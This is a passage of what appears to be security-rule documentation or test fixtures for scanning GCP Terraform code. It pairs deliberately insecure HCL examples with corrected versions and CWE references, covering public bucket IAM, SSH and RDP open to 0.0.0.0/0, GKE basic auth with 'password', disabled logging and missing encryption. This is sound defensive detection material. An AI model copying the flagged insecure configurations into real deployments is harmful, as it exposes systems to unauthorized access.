# ok: gcp-cloud-storage-logging
resource "google_storage_bucket" "success" {
    name     = "jgwloggingbucket"
    location = var.location
    uniform_bucket_level_access = true
    logging {
        log_bucket = "mylovelybucket"
    }
}
```

CWE-778: Insufficient Logging

---

Storage buckets should not be publicly accessible to prevent data exposure.

**Incorrect: public access via IAM member**

```hcl
# ruleid: gcp-storage-bucket-not-public-iam-member
resource "google_storage_bucket_iam_member" "fail" {
    bucket = google_storage_bucket.default.name
    role = "roles/storage.admin"
    member = "allUsers"
}
```

**Correct: access restricted to specific users**

```hcl
# ok: gcp-storage-bucket-not-public-iam-member
resource "google_storage_bucket_iam_member" "success" {
    bucket = google_storage_bucket.default.name
    role = "roles/storage.admin"
    member = "user:jane@example.com"
}
```

**Incorrect: public access via IAM binding**

```hcl
# ruleid: gcp-storage-bucket-not-public-iam-binding
resource "google_storage_bucket_iam_binding" "fail" {
    bucket = google_storage_bucket.default.name
    role = "roles/storage.admin"
    members = [
    "user:jane@example.com",
    "allAuthenticatedUsers"
    ]
}
```

**Correct: no public members in binding**

```hcl
# ok: gcp-storage-bucket-not-public-iam-binding
resource "google_storage_bucket_iam_binding" "success" {
    bucket = google_storage_bucket.default.name
    role = "roles/storage.admin"
    members = [
    "user:jane@example.com"
    ]
}
```

CWE-284: Improper Access Control

---

Versioning protects against accidental deletion and enables recovery of previous versions.

**Incorrect: versioning disabled or not set**

```hcl
# ruleid: gcp-storage-versioning-enabled
resource "google_storage_bucket" "fail1" {
  name     = "foo"
  location = "EU"

  versioning = {
    enabled = false
  }
}

# ruleid: gcp-storage-versioning-enabled
resource "google_storage_bucket" "fail2" {
  name     = "foo"
  location = "EU"
}
```

**Correct: versioning enabled**

```hcl
# ok: gcp-storage-versioning-enabled
resource "google_storage_bucket" "pass" {
  name     = "foo"
  location = "EU"

  versioning = {
    enabled = true
  }
}
```

---

Use Customer Supplied Encryption Keys (CSEK) or Cloud KMS keys to encrypt VM boot disks.

**Incorrect: no encryption key specified**

```hcl
# ruleid: gcp-compute-boot-disk-encryption
resource "google_compute_instance" "fail" {
    name         = "test"
    machine_type = "n1-standard-1"
    zone         = "us-central1-a"
    boot_disk {}
}
```

**Correct: encryption key specified**

```hcl
# ok: gcp-compute-boot-disk-encryption
resource "google_compute_instance" "success" {
    name         = "test"
    machine_type = "n1-standard-1"
    zone         = "us-central1-a"
    boot_disk {
        disk_encryption_key_raw = "acXTX3rxrKAFTF0tYVLvydU1riRZTvUNC4g5I11NY-c="
    }
}

# ok: gcp-compute-boot-disk-encryption
resource "google_compute_instance" "success" {
    name         = "test"
    machine_type = "n1-standard-1"
    zone         = "us-central1-a"
    boot_disk {
        kms_key_self_link = google_kms_crypto_key.example-key.id
    }
}
```

CWE-311: Missing Encryption of Sensitive Data

---

Use Customer Supplied Encryption Keys (CSEK) or Cloud KMS keys to encrypt standalone disks.

**Incorrect: no encryption key specified**

```hcl
# ruleid: gcp-compute-disk-encryption
resource "google_compute_disk" "fail" {
    name  = "test-disk"
    type  = "pd-ssd"
    zone  = "us-central1-a"
    image = "debian-8-jessie-v20170523"
    physical_block_size_bytes = 4096
}
```

**Correct: encryption key specified**

```hcl
# ok: gcp-compute-disk-encryption
resource "google_compute_disk" "success" {
    name  = "test-disk"
    type  = "pd-ssd"
    zone  = "us-central1-a"
    image = "debian-8-jessie-v20170523"
    physical_block_size_bytes = 4096
    disk_encryption_key {
        raw_key = "acXTX3rxrKAFTF0tYVLvydU1riRZTvUNC4g5I11NY-c="
    }
}

# ok: gcp-compute-disk-encryption
resource "google_compute_disk" "success" {
    name  = "test-disk"
    type  = "pd-ssd"
    zone  = "us-central1-a"
    image = "debian-8-jessie-v20170523"
    physical_block_size_bytes = 4096
    disk_encryption_key {
        kms_key_self_link = google_kms_crypto_key.example-key.id
    }
}
```

CWE-311: Missing Encryption of Sensitive Data

---

Compute instances should not have public IP addresses unless necessary.

**Incorrect: public IP via access_config**

```hcl
# ruleid: gcp-compute-public-ip
resource "google_compute_instance" "fail" {
  name         = "test"
  machine_type = "n1-standard-1"
  zone         = "us-central1-a"
  boot_disk {
    auto_delete = true
  }

  network_interface {
    network = "default"
    access_config {
    }
  }
}
```

**Correct: no access_config block**

```hcl
# ok: gcp-compute-public-ip
resource "google_compute_instance" "pass" {
  name         = "test"
  machine_type = "n1-standard-1"
  zone         = "us-central1-a"
  boot_disk {
    auto_delete = true
  }
  network_interface {

  }
}
```

CWE-284: Improper Access Control

---

Serial port access should be disabled to prevent unauthorized console access.

**Incorrect: serial port enabled**

```hcl
# ruleid: gcp-compute-serial-ports
resource "google_compute_instance" "fail" {
    name         = "test"
    machine_type = "n1-standard-1"
    zone         = "us-central1-a"
    boot_disk {}
    metadata = {
        serial-port-enable = true
    }
}
```

**Correct: serial port not enabled**

```hcl
# ok: gcp-compute-serial-ports
resource "google_compute_instance" "success1" {
    name         = "test"
    machine_type = "n1-standard-1"
    zone         = "us-central1-a"
    boot_disk {}
}

# ok: gcp-compute-serial-ports
resource "google_compute_instance" "success2" {
    name         = "test"
    machine_type = "n1-standard-1"
    zone         = "us-central1-a"
    boot_disk {}
    metadata = {
        serial-port-enable = false
    }
}
```

CWE-284: Improper Access Control

---

Do not override project-level OS Login settings at the instance level.

**Incorrect: OS Login disabled at instance level**

```hcl
# ruleid: gcp-compute-os-login
resource "google_compute_instance" "fail" {
    name         = "test"
    machine_type = "n1-standard-1"
    zone         = "us-central1-a"
    boot_disk {}
    metadata = {
        enable-oslogin = false
    }
}
```

**Correct: OS Login not overridden or enabled**

```hcl
# ok: gcp-compute-os-login
resource "google_compute_instance" "success1" {
    name         = "test"
    machine_type = "n1-standard-1"
    zone         = "us-central1-a"
    boot_disk {}
    metadata = {
        foo = "bar"
    }
}

# ok: gcp-compute-os-login
resource "google_compute_instance" "success2" {
    name         = "test"
    machine_type = "n1-standard-1"
    zone         = "us-central1-a"
    boot_disk {}
    metadata = {
        enable-oslogin = true
    }
}
```

CWE-284: Improper Access Control

---

IP forwarding should be disabled unless the instance is explicitly a router.

**Incorrect: IP forwarding enabled**

```hcl
# ruleid: gcp-compute-ip-forward
resource "google_compute_instance" "fail" {
    name         = "test"
    machine_type = "n1-standard-1"
    zone         = "us-central1-a"
    can_ip_forward = true
}
```

**Correct: IP forwarding disabled or not set**

```hcl
# ok: gcp-compute-ip-forward
resource "google_compute_instance" "success" {
    name         = "test"
    machine_type = "n1-standard-1"
    zone         = "us-central1-a"
}

# ok: gcp-compute-ip-forward
resource "google_compute_instance" "success2" {
    name         = "gke-test"
    machine_type = "n1-standard-1"
    zone         = "us-central1-a"
    can_ip_forward = false
}
```

CWE-284: Improper Access Control

---

Shielded VMs provide verifiable integrity of your Compute Engine VM instances.

**Incorrect: shielded instance config not set or integrity monitoring disabled**

```hcl
# ruleid: gcp-compute-shielded-vm
resource "google_compute_instance" "fail1" {
    name         = "test"
    machine_type = "n1-standard-1"
    zone         = "us-central1-a"
    boot_disk {}
}

# ruleid: gcp-compute-shielded-vm
resource "google_compute_instance" "fail2" {
    name         = "test"
    machine_type = "n1-standard-1"
    zone         = "us-central1-a"
    boot_disk {}
    shielded_instance_config {
        enable_integrity_monitoring = false
    }
}
```

**Correct: shielded VM enabled with vTPM and integrity monitoring**

```hcl
# ok: gcp-compute-shielded-vm
resource "google_compute_instance" "success" {
    name         = "test"
    machine_type = "n1-standard-1"
    zone         = "us-central1-a"
    boot_disk {}
    shielded_instance_config {
        enable_vtpm = true
        enable_integrity_monitoring = true
    }
}
```

---

SSH access should not be open to the entire internet (0.0.0.0/0).

**Incorrect: SSH open to world**

```hcl
# ruleid: gcp-compute-firewall-unrestricted-ingress-22
resource "google_compute_firewall" "allow_ssh_int" {
  name    = "example"
  network = "google_compute_network.vpc.name"

  allow {
    protocol = "tcp"
    ports    = [22]
  }

  source_ranges = ["0.0.0.0/0"]
}

# ruleid: gcp-compute-firewall-unrestricted-ingress-22
resource "google_compute_firewall" "allow_multiple" {
  name    = "example"
  network = "google_compute_network.vpc.name"

  allow {
    protocol = "tcp"
    ports    = ["1024-65535", "22"]
  }

  source_ranges = ["0.0.0.0/0"]
}
```

**Correct: SSH restricted to specific IPs**

```hcl
# ok: gcp-compute-firewall-unrestricted-ingress-22
resource "google_compute_firewall" "restricted" {
  name    = "example"
  network = "google_compute_network.vpc.name"

  allow {
    protocol = "tcp"
    ports    = ["22"]
  }

  source_ranges = ["172.1.2.3/32"]
  target_tags   = ["ssh"]
}
```

CWE-284: Improper Access Control

---

RDP access should not be open to the entire internet (0.0.0.0/0).

**Incorrect: RDP open to world**

```hcl
# ruleid: gcp-compute-firewall-unrestricted-ingress-3389
resource "google_compute_firewall" "allow_rdp_int" {
  name    = "example"
  network = "google_compute_network.vpc.name"

  allow {
    protocol = "tcp"
    ports    = [3389]
  }

  source_ranges = ["0.0.0.0/0"]
}
```

**Correct: RDP restricted to specific IPs**

```hcl
# ok: gcp-compute-firewall-unrestricted-ingress-3389
resource "google_compute_firewall" "restricted" {
  name    = "example"
  network = "google_compute_network.vpc.name"

  allow {
    protocol = "tcp"
    ports    = ["3389"]
  }

  source_ranges = ["172.1.2.3/32"]
}
```

CWE-284: Improper Access Control

---

Legacy Attribute-Based Access Control (ABAC) should be disabled in favor of RBAC.

**Incorrect: legacy ABAC enabled**

```hcl
# ruleid: gcp-gke-legacy-auth-enabled
resource "google_container_cluster" "fail" {
  name               = "marcellus-wallace"
  location           = "us-central1-a"
  initial_node_count = 3
  enable_legacy_abac = true
}
```

**Correct: legacy ABAC not enabled**

```hcl
# ok: gcp-gke-legacy-auth-enabled
resource "google_container_cluster" "success" {
  name               = "marcellus-wallace"
  location           = "us-central1-a"
  initial_node_count = 3
}
```

CWE-284: Improper Access Control

---

GKE clusters should be configured as private clusters to restrict network access.

**Incorrect: no private cluster config**

```hcl
# ruleid: gcp-gke-private-cluster-config
resource "google_container_cluster" "fail" {
  name               = "marcellus-wallace"
  location           = "us-central1-a"
  initial_node_count = 3
}
```

**Correct: private cluster configured**

```hcl
# ok: gcp-gke-private-cluster-config
resource "google_container_cluster" "success" {
  name               = "marcellus-wallace"
  location           = "us-central1-a"
  initial_node_count = 3
  private_cluster_config {
    enable_private_endpoint = false
    enable_private_nodes    = false
    master_ipv4_cidr_block  = "10.0.0.0/28"
  }
}
```

CWE-284: Improper Access Control

---

GKE cluster logging should be enabled for security monitoring and audit.

**Incorrect: logging disabled**

```hcl
# ruleid: gcp-gke-cluster-logging
resource "google_container_cluster" "fail" {
    name = "my-gke-cluster"
    location = "us-central1"
    remove_default_node_pool = true
    initial_node_count = 1
    logging_service = "none"
    master_auth  {
        username = ""
        password= ""
        client_certificate_config {
            issue_client_certificate = false
        }
    }
}
```

**Correct: default logging or explicitly enabled**

```hcl
# ok: gcp-gke-cluster-logging
resource "google_container_cluster" "success" {
    name = "my-gke-cluster"
    location = "us-central1"
    remove_default_node_pool = true
    initial_node_count = 1
    master_auth {
        username = ""
        password = ""
        client_certificate_config {
            issue_client_certificate = false
        }
    }
}
```

CWE-320: Key Management Errors

---

Network policies should be enabled to control pod-to-pod communication.

**Incorrect: network policy disabled**

```hcl
# ruleid: gcp-gke-network-policy-enabled
resource "google_container_cluster" "fail" {
  name = "google_cluster"
  network_policy {
    enabled = false
  }
}
```

**Correct: network policy enabled or using advanced datapath**

```hcl
# ok: gcp-gke-network-policy-enabled
resource "google_container_cluster" "pass" {
  name = "google_cluster"
  network_policy {
    enabled = true
  }
}

# ok: gcp-gke-network-policy-enabled
resource "google_container_cluster" "pass2" {
  name              = "google_cluster"
  datapath_provider = "ADVANCED_DATAPATH"
  network_policy {
    enabled = false
  }
}
```

CWE-284: Improper Access Control

---

Basic authentication should be disabled in favor of more secure authentication methods.

**Incorrect: basic auth with username/password or no master_auth config**

```hcl
# ruleid: gcp-gke-basic-auth
resource "google_container_cluster" "fail1" {
  name               = "marcellus-wallace"
  location           = "us-central1-a"
  initial_node_count = 3

  timeouts {
    create = "30m"
    update = "40m"
  }
}

# ruleid: gcp-gke-basic-auth
resource "google_container_cluster" "fail2" {
  name               = "google_cluster_bad"
  monitoring_service = "none"
  enable_legacy_abac = True
  master_authorized_networks_config {
    cidr_blocks {
      cidr_block   = "0.0.0.0/0"
      display_name = "The world"
    }
  }

  master_auth {
    username = "test"
    password = "password"
  }

}
```

**Correct: basic auth disabled with empty credentials or client certificate config**

```hcl
# ok: gcp-gke-basic-auth
resource "google_container_cluster" "pass" {
  name               = "google_cluster"
  monitoring_service = "monitoring.googleapis.com"
  master_authorized_networks_config {}
  master_auth {
    client_certificate_config {
      issue_client_certificate = false
    }
  }
}

# ok: gcp-gke-basic-auth
resource "google_container_cluster" "pass2" {
  name               = "google_cluster"
  monitoring_service = "monitoring.googleapis.com"
  master_authorized_networks_config {}
  master_auth {
    username = ""
    password = ""
    client_certificate_config {
      issue_client_certificate = false
    }
  }
}
```

CWE-284: Improper Access Control

---

Master authorized networks restrict access to the Kubernetes API server.

**Incorrect: no master authorized networks**

```hcl
# ruleid: gcp-gke-master-authz-networks-enabled
resource "google_container_cluster" "fail" {
  name               = "marcellus-wallace"
  location           = "us-central1-a"
  initial_node_count = 3
}
```

**Correct: master authorized networks configured**

```hcl
# ok: gcp-gke-master-authz-networks-enabled
resource "google_container_cluster" "success" {
  name               = "marcellus-wallace"
  location           = "us-central1-a"
  initial_node_count = 3
  master_authorized_networks_config {
    cidr_blocks {
      cidr_block   = "73.35.171.194/32"
      display_name = "net1"
    }
  }
}
```

CWE-284: Improper Access Control

---

GKE cluster monitoring should be enabled for visibility and alerting.

**Incorrect: monitoring disabled**

```hcl
# ruleid: gcp-gke-monitoring-enabled
resource "google_container_cluster" "fail" {
    name = "my-gke-cluster"
    location = "us-central1"
    monitoring_service = "none"
  }
```

**Correct: monitoring enabled**

```hcl
# ok: gcp-gke-monitoring-enabled
resource "google_container_cluster" "success" {
  name = "my-gke-cluster"
  location = "us-central1"
  monitoring_service = "monitoring.googleapis.com"
}
```

CWE-284: Improper Access Control

---

Client certificate authentication should be disabled for GKE clusters.

**Incorrect: client certificate enabled**

```hcl
# ruleid: gcp-gke-client-certificate-disabled
resource "google_container_cluster" "success" {
  name               = "marcellus-wallace"
  location           = "us-central1-a"
  initial_node_count = 3
  master_auth {
    client_certificate_config {
        issue_client_certificate = true
    }
  }
}
```

**Correct: client certificate disabled**

```hcl
# ok: gcp-gke-client-certificate-disabled
resource "google_container_cluster" "fail" {
  name               = "marcellus-wallace"
  location           = "us-central1-a"
  initial_node_count = 3
  master_auth {
    client_certificate_config {
        issue_client_certificate = false
    }
  }
}
```

CWE-284: Improper Access Control

---

VPC Flow Logs and intranode visibility help with network monitoring and troubleshooting.

**Incorrect: intranode visibility not enabled**

```hcl
# ruleid: gcp-gke-enabled-vpc-flow-logs
resource "google_container_cluster" "fail" {
  name               = var.name
  location           = var.location
  initial_node_count = 1
  project            = data.google_project.project.name

  network    = var.network
  subnetwork = var.subnetwork
  # enable_intranode_visibility not set
}
```

**Correct: intranode visibility enabled**

```hcl
# ok: gcp-gke-enabled-vpc-flow-logs
resource "google_container_cluster" "success" {
  name               = var.name
  location           = var.location
  initial_node_count = 1
  project            = data.google_project.project.name

  network                     = var.network
  subnetwork                  = var.subnetwork
  enable_intranode_visibility = true
}
```

CWE-284: Improper Access Control

---

Binary Authorization ensures only trusted container images are deployed.

**Incorrect: binary authorization disabled**

```hcl
# ruleid: gcp-gke-binary-authorization
resource "google_container_cluster" "fail1" {
  name               = var.name
  location           = var.location
  initial_node_count = 1

  enable_binary_authorization = false
}
```

**Correct: binary authorization enabled**

```hcl
# ok: gcp-gke-binary-authorization
resource "google_container_cluster" "success" {
  name                        = var.name
  location                    = var.location
  initial_node_count          = 1
  enable_binary_authorization = true
}
```

---

Shielded GKE nodes provide verifiable node identity and integrity.

**Incorrect: shielded nodes disabled**

```hcl
# ruleid: gcp-gke-enable-shielded-nodes
resource "google_container_cluster" "fail" {
  name               = var.name
  location           = var.location
  initial_node_count = 1

  enable_shielded_nodes = false
}
```

**Correct: shielded nodes enabled or default**

```hcl
# ok: gcp-gke-enable-shielded-nodes
resource "google_container_cluster" "success2" {
  name               = var.name
  location           = var.location
  initial_node_count = 1

  enable_shielded_nodes = true
}
```

---

Auto-repair automatically fixes unhealthy nodes.

**Incorrect: auto-repair disabled**

```hcl
# ruleid: gcp-gke-nodepool-auto-repair-enabled
resource "google_container_node_pool" "fail" {
    name = "my-gke-cluster"
    location = "us-central1"
    cluster = "my-cluster"
    management {
      auto_repair  = false
      auto_upgrade = false
    }
}
```

**Correct: auto-repair enabled**

```hcl
# ok: gcp-gke-nodepool-auto-repair-enabled
resource "google_container_node_pool" "success" {
  name = "my-gke-cluster"
  location = "us-central1"
  cluster = "my-cluster"
  management {
    auto_repair  = true
    auto_upgrade = true
  }
}
```

---

All Cloud SQL database connections should require SSL encryption.

**Incorrect: SSL not required**

```hcl
# ruleid: gcp-sql-database-require-ssl
resource "google_sql_database_instance" "fail" {
  database_version = "MYSQL_8_0"
  name             = "instance"
  region           = "us-central1"
  settings {
    tier = "db-f1-micro"
  }
}
```

**Correct: SSL required**

```hcl
# ok: gcp-sql-database-require-ssl
resource "google_sql_database_instance" "success" {
  database_version = "MYSQL_8_0"
  name             = "instance"
  region           = "us-central1"
  ip_configuration {
      ipv4_enabled = true
      require_ssl = true
  }
}
```

CWE-326: Inadequate Encryption Strength

---

Cloud SQL instances should not be accessible from 0.0.0.0/0.

**Incorrect: public access via 0.0.0.0/0**

```hcl
# ruleid: gcp-sql-public-database
resource "google_sql_database_instance" "instance1-fail" {
  database_version = "MYSQL_8_0"
  name             = "instance"
  region           = "us-central1"
  settings {
    tier = "db-f1-micro"
    ip_configuration {
      ipv4_enabled = true
      authorized_networks {
        name  = "XYZ"
        value = "1.2.3.4"
      }
      authorized_networks {
        name  = "Public"
        value = "0.0.0.0/0"
      }
    }
  }
}
```

**Correct: restricted to specific IPs or private network**

```hcl
# ok: gcp-sql-public-database
resource "google_sql_database_instance" "instance2-pass" {
  database_version = "MYSQL_8_0"
  name             = "instance"
  region           = "us-central1"
  settings {
    tier = "db-f1-micro"
    ip_configuration {
      ipv4_enabled = true
      authorized_networks {
        name  = "XYZ"
        value = "1.2.3.4"
      }
      authorized_networks {
        name  = "ABC"
        value = "5.5.5.0/24"
      }
    }
  }
}

# ok: gcp-sql-public-database
resource "google_sql_database_instance" "instance6-pass" {
  provider = google-beta

  name   = "private-instance-${random_id.db_name_suffix.hex}"
  region = "us-central1"

  depends_on = [google_service_networking_connection.private_vpc_connection]

  settings {
    tier = "db-f1-micro"
    ip_configuration {
      ipv4_enabled    = false
      private_network = google_compute_network.private_network.id
    }
  }
}
```

CWE-284: Improper Access Control

---

SQL Server instances should not have public IPs.

**Incorrect: public IP enabled for SQL Server**

```hcl
# ruleid: gcp-sqlserver-no-public-ip
resource "google_sql_database_instance" "fail" {
  database_version = "SQLSERVER_2017_STANDARD"
  name             = "general-sqlserver12"
  region           = "us-central1"

  settings {
    tier = "db-custom-1-4096"

    ip_configuration {
      ipv4_enabled    = true
      private_network = "projects/gcp-bridgecrew-deployment/global/networks/default"
      require_ssl     = "false"
    }
  }
}
```

**Correct: public IP disabled**

```hcl
# ok: gcp-sqlserver-no-public-ip
resource "google_sql_database_instance" "pass" {
  database_version = "SQLSERVER_2017_STANDARD"
  name             = "general-sqlserver12"
  region           = "us-central1"

  settings {
    tier = "db-custom-1-4096"

    ip_configuration {
      ipv4_enabled    = false
      private_network = "projects/gcp-bridgecrew-deployment/global/networks/default"
    }
  }
}
```

CWE-284: Improper Access Control

---

PostgreSQL instances should log connections for auditing.

**Incorrect: log_connections flag set to off**

```hcl
# ruleid: gcp-postgresql-log-connection
resource "google_sql_database_instance" "fail" {
  database_version = "POSTGRES_12"
  name             = "general-pos121"
  region           = "us-central1"
  settings {
    database_flags {
      name  = "log_connections"
      value = "off"
    }
    tier = "db-custom-1-3840"
  }
}
```

**Correct: log_connections flag set to on**

```hcl
# ok: gcp-postgresql-log-connection
resource "google_sql_database_instance" "pass1" {
  database_version = "POSTGRES_12"
  name             = "general-pos121"
  region           = "us-central1"
  settings {
    database_flags {
      name  = "log_connections"
      value = "on"
    }
    tier         = "db-custom-1-3840"
  }
}
```

---

Default service accounts should not be used at the project level.

**Incorrect: default service account used**

```hcl
# ruleid: gcp-project-member-default-service-account-iam-member
resource "google_project_iam_member" "fail" {
    project = "your-project-id"
    role    = "roles/resourcemanager.organizationAdmin"
    member  = "serviceAccount:test-compute@developer.gserviceaccount.com"
}
```

**Correct: specific user or service account**

```hcl
# ok: gcp-project-member-default-service-account-iam-member
resource "google_project_iam_member" "success" {
    project = "your-project-id"
    role    = "roles/other"
    member  = "user@mail.com"
}
```

CWE-284: Improper Access Control

---

Users should not be assigned Service Account User or Service Account Token Creator roles at the project level.

**Incorrect: dangerous SA roles assigned**

```hcl
# ruleid: gcp-project-service-account-user-iam-member
resource "google_project_iam_member" "fail1" {
    project = "your-project-id"
    role    = "roles/iam.serviceAccountTokenCreator"
    member  = "user:jane@example.com"
}

# ruleid: gcp-project-service-account-user-iam-member
resource "google_project_iam_member" "fail2" {
    project = "your-project-id"
    role    = "roles/iam.serviceAccountUser"
    member  = "user:jane@example.com"
}
```

**Correct: appropriate roles assigned**

```hcl
# ok: gcp-project-service-account-user-iam-member
resource "google_project_iam_member" "success" {
    project = "your-project-id"
    role    = "roles/editor"
    member  = "user:jane@example.com"
}
```

CWE-284: Improper Access Control

---

VPC Flow Logs provide visibility into network traffic for analysis and troubleshooting.

**Incorrect: no log_config**

```hcl
# ruleid: gcp-sub-network-logging-enabled
resource "google_compute_subnetwork" "default" {
  name          = "example"
  ip_cidr_range = "10.0.0.0/16"
  network       = "google_compute_network.vpc.id"
}
```

**Correct: log_config configured**

```hcl
# ok: gcp-sub-network-logging-enabled
resource "google_compute_subnetwork" "enabled" {
  name          = "example"
  ip_cidr_range = "10.0.0.0/16"
  network       = "google_compute_network.vpc.self_link"

  log_config {
    aggregation_interval = "INTERVAL_10_MIN"
    flow_sampling        = 0.5
    metadata             = "INCLUDE_ALL_METADATA"
  }
}
```

CWE-284: Improper Access Control

---

Projects should not use the auto-created default network.

**Incorrect: default network auto-created**

```hcl
# ruleid: gcp-project-default-network
resource "google_project" "fail" {
    name       = "My Project"
    project_id = "your-project-id"
    org_id     = "1234567"
}
```

**Correct: default network disabled**

```hcl
# ok: gcp-project-default-network
resource "google_project" "pass" {
    name       = "My Project"
    project_id = "your-project-id"
    org_id     = "1234567"
    auto_create_network   = false
}
```

CWE-284: Improper Access Control

---

KMS keys should have lifecycle protection to prevent accidental deletion.

**Incorrect: prevent_destroy not set or false**

```hcl
# ruleid: gcp-kms-prevent-destroy
resource "google_kms_crypto_key" "fail" {
  name            = "crypto-key-example"
  key_ring        = google_kms_key_ring.keyring.id
  rotation_period = "15552000s"

  lifecycle {
    prevent_destroy = false
  }
}

# ruleid: gcp-kms-prevent-destroy
resource "google_kms_crypto_key" "fail2" {
  name            = "crypto-key-example"
  key_ring        = google_kms_key_ring.keyring.id
  rotation_period = "15552000s"
}
```

**Correct: prevent_destroy enabled**

```hcl
# ok: gcp-kms-prevent-destroy
resource "google_kms_crypto_key" "pass" {
  name            = "crypto-key-example"
  key_ring        = google_kms_key_ring.keyring.id
  rotation_period = "15552000s"

  lifecycle {
    prevent_destroy = true
  }
}
```

CWE-284: Improper Access Control

---

Memorystore for Redis instances should have authentication enabled.

**Incorrect: auth not enabled**

```hcl
# ruleid: gcp-memory-store-for-redis-auth-enabled
resource "google_redis_instance" "fail1" {
  name           = "my-fail-instance1"
  tier           = "STANDARD_HA"
  memory_size_gb = 1

  location_id             = "us-central1-a"
  alternative_location_id = "us-central1-f"

  redis_version = "REDIS_4_0"
  display_name  = "I am insecure"
}

# ruleid: gcp-memory-store-for-redis-auth-enabled
resource "google_redis_instance" "fail2" {
  name           = "my-fail-instance2"
  memory_size_gb = 1
  auth_enabled = false
}
```

**Correct: auth enabled**

```hcl
# ok: gcp-memory-store-for-redis-auth-enabled
resource "google_redis_instance" "pass" {
  name           = "my-pass-instance"
  memory_size_gb = 1
  tier           = "STANDARD_HA"

  location_id             = "us-central1-a"
  alternative_location_id = "us-central1-f"
  redis_version           = "REDIS_6_X"

  labels = {
    foo = "bar"
  }

  auth_enabled = true
}
```

CWE-284: Improper Access Control

---

Memorystore for Redis should use in-transit encryption.

**Incorrect: transit encryption disabled or not set**

```hcl
# ruleid: gcp-memory-store-for-redis-intransit-encryption
resource "google_redis_instance" "fail" {
  provider       = google-beta
  name           = "mrr-memory-cache"
  tier           = "STANDARD_HA"
  memory_size_gb = 5

  redis_version      = "REDIS_6_X"
  display_name       = "Terraform Test Instance"
}

# ruleid: gcp-memory-store-for-redis-intransit-encryption
resource "google_redis_instance" "fail2" {
  provider       = google-beta
  name           = "mrr-memory-cache"
  tier           = "STANDARD_HA"
  memory_size_gb = 5

  transit_encryption_mode = "DISABLED"
}
```

**Correct: transit encryption enabled**

```hcl
# ok: gcp-memory-store-for-redis-intransit-encryption
resource "google_redis_instance" "pass" {
  provider       = google-beta
  name           = "mrr-memory-cache"
  tier           = "STANDARD_HA"
  memory_size_gb = 5

  redis_version      = "REDIS_6_X"
  display_name       = "Terraform Test Instance"

  transit_encryption_mode = "SERVER_AUTHENTICATION"
}
```

CWE-284: Improper Access Control

---

Cloud Run services should not be publicly accessible unless necessary.

**Incorrect: public access via allUsers or allAuthenticatedUsers**

```hcl
# ruleid: gcp-run-private-service-iam-member
resource "google_cloud_run_service_iam_member" "fail1" {
  location = google_cloud_run_service.default.location
  service = google_cloud_run_service.default.name
  role = "roles/viewer"
  member  = "allAuthenticatedUsers"
}

# ruleid: gcp-run-private-service-iam-member
resource "google_cloud_run_service_iam_member" "fail2" {
  location = google_cloud_run_service.default.location
  service = google_cloud_run_service.default.name
  role = "roles/viewer"
  member  = "allUsers"
}
```

**Correct: access restricted to specific users**

```hcl
# ok: gcp-run-private-service-iam-member
resource "google_cloud_run_service_iam_member" "pass1" {
  location = google_cloud_run_service.default.location
  service = google_cloud_run_service.default.name
  role = "roles/viewer"
  member = "user:jane@example.com"
}

# ok: gcp-run-private-service-iam-member
resource "google_cloud_run_service_iam_member" "pass2" {
  location = google_cloud_run_service.default.location
  service = google_cloud_run_service.default.name
  role = "roles/viewer"
  member = "domain:example.com"
}
```

CWE-284: Improper Access Control

---

Cloud Build worker pools should not have external IP addresses.

**Incorrect: external IP enabled or not set**

```hcl
# ruleid: gcp-build-workers-private
resource "google_cloudbuild_worker_pool" "fail1" {
  name = "my-pool"
  location = "europe-west1"
  worker_config {
    disk_size_gb = 100
    machine_type = "e2-standard-4"
    no_external_ip = false
  }
}

# ruleid: gcp-build-workers-private
resource "google_cloudbuild_worker_pool" "fail2" {
  name = "my-pool"
  location = "europe-west1"
  worker_config {
    disk_size_gb = 100
    machine_type = "e2-standard-4"
  }
}
```

**Correct: no external IP**

```hcl
# ok: gcp-build-workers-private
resource "google_cloudbuild_worker_pool" "pass" {
  name = "my-pool"
  location = "europe-west1"
  worker_config {
    disk_size_gb = 100
    machine_type = "e2-standard-4"
    no_external_ip = true
  }
}
```

CWE-284: Improper Access Control

---

BigQuery datasets should use customer-managed encryption keys.

**Incorrect: no encryption configuration**

```hcl
# ruleid: gcp-bigquery-dataset-encrypted-with-cmk
resource "google_bigquery_dataset" "fail" {
  dataset_id                  = "example_dataset"
  friendly_name               = "test"
  description                 = "This is a test description"
  location                    = "EU"
  default_table_expiration_ms = 3600000

  labels = {
    env = "default"
  }

  access {
    role          = "OWNER"
    special_group = "allAuthenticatedUsers"
  }
}
```

**Correct: encryption configured with KMS key**

```hcl
# ok: gcp-bigquery-dataset-encrypted-with-cmk
resource "google_bigquery_dataset" "pass" {
  dataset_id                  = var.dataset.dataset_id
  friendly_name               = var.dataset.friendly_name
  description                 = var.dataset.description
  location                    = var.location
  default_table_expiration_ms = var.dataset.default_table_expiration_ms

  default_encryption_configuration {
    kms_key_name = google_kms_crypto_key.example.name
  }
}
```

CWE-320: Key Management Errors

---

Pub/Sub topics should use customer-managed encryption keys.

**Incorrect: no KMS key specified**

```hcl
# ruleid: gcp-pubsub-encrypted-with-cmk
resource "google_pubsub_topic" "fail" {
  name = "example-topic"
}
```

**Correct: KMS key specified**

```hcl
# ok: gcp-pubsub-encrypted-with-cmk
resource "google_pubsub_topic" "pass" {
  name         = "example-topic"
  kms_key_name = google_kms_crypto_key.crypto_key.id
}
```

CWE-320: Key Management Errors

---

Artifact Registry repositories should use customer-managed encryption keys.

**Incorrect: no KMS key specified**

```hcl
# ruleid: gcp-artifact-registry-encrypted-with-cmk
resource "google_artifact_registry_repository" "fail" {
  provider = google-beta

  location      = "us-central1"
  repository_id = "my-repository"
  description   = "example docker repository with cmek"
  format        = "DOCKER"
}
```

**Correct: KMS key specified**

```hcl
# ok: gcp-artifact-registry-encrypted-with-cmk
resource "google_artifact_registry_repository" "pass" {
  provider = google-beta

  location      = "us-central1"
  repository_id = "my-repository"
  description   = "example docker repository with cmek"
  format        = "DOCKER"
  kms_key_name  = google_kms_crypto_key.example.name
}
```

CWE-320: Key Management Errors

---

Dataproc clusters should not have public IP addresses.

**Incorrect: internal_ip_only not set or false**

```hcl
# ruleid: gcp-dataproc-cluster-public-ip
resource "google_dataproc_cluster" "fail1" {
  name   = "my-fail1-cluster"
  region = "us-central1"

  cluster_config {
    gce_cluster_config {
      zone = "us-central1-a"
      # "internal_ip_only" does not exist
      # and the default is public IPs
    }
  }
}

# ruleid: gcp-dataproc-cluster-public-ip
resource "google_dataproc_cluster" "fail2" {
  name   = "my-fail2-cluster"
  region = "us-central1"

  cluster_config {
    gce_cluster_config {
